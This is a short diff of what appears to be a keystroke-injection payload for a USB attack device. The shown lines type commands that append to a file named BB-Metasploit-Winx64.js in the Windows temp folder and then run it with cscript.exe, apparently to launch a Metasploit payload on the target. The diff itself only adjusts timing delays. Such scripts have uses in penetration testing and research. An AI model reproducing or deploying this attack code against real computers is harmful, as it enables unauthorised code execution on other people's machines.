@@ -76,9 +76,8 @@ Q ENTER
 Q STRING "echo } >> %temp%\BB-Metasploit-Winx64.js"
 Q ENTER
 LED R
-Q DELAY 200
 Q STRING "@cscript.exe %temp%\BB-Metasploit-Winx64.js"
 Q ENTER
 LED B
-Q DELAY 200
+Q DELAY 1000
 shutdown 0
